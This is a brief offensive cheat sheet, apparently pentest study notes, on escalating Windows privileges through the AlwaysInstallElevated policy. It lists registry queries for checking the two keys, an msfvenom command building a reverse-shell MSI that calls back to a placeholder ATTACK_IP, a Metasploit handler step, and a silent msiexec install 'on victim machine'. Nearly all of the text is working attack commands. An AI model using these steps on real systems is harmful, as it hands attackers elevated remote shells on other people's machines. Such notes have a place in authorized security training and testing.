# Example:

### Query and set 2 registry values:

### reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

### reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

## Exploitation works only if BOTH have set values to 1!

### 1: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

### 2: Use metasploit handler (use exploit/multi/handler)

### 3: On victim machine: msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
